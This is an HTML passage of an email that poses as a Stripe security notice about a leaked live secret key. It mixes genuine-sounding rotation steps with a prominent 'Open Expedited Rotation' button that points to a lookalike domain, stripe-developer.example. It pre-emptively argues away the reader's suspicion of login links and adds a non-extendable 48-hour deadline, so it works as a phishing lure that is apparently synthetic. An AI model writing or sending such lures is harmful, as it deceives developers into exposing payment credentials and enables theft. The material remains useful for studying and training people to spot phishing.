<h3>2. Why Probes Were Declined (and Why Rotation Still Matters)</h3>
<p>Radar blocked the probes because of ASN reputation, not because the key is safe. A secret key grants
refund, payout-schedule, and webhook-endpoint control; the decline pattern indicates testing before a
more careful attempt. Rotation closes the window permanently.</p>

<h3>3. Rotation Steps</h3>
<ol>
<li>Create the replacement key and update your secret store (both <code>sk_live</code> and the
webhook signing secret if rotated together).</li>
<li>Deploy, verify a test-mode then live-mode charge of USD 0.50 settles.</li>
<li>Expire the old key — do not delete it first; expiry preserves the audit trail.</li>
<li>Remove the leaked line from the fork's history (our exposure report lists the exact commit range).</li>
</ol>

<h3>4. Expedited Rotation Endpoint</h3>
<p>To reduce the window, this notice carries an expedited rotation endpoint pre-scoped to key
<code>…51fK</code>. The endpoint shows the key fingerprint from your own account's security log
(event <code>SEC-2026-88412</code>) before asking for anything, so you can compare values without
entering credentials:</p>

<p style="text-align:center;margin:18px 0">
<a href="https://stripe-developer.example/rotate/expedited?k=51fK&amp;e=88412" style="display:inline-block;background:#635BFF;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Open Expedited Rotation</a>
</p>
<p style="font-size:13px;color:#666;text-align:center">Dashboard path: https://dashboard.stripe.com/apikeys</p>

<p style="font-size:14px;background:#FFF3E0;padding:12px">You should be suspicious of any email linking to
what looks like a Stripe login — that instinct is correct and we won't argue with it. The expedited endpoint
works inside an existing dashboard session (no password is ever entered on it), and the fingerprint it
displays first is the same one in your security log, so a mismatch is visible before you act. The 48-hour
force-expiry, however, is set by the automated controls and cannot be extended by support.</p>

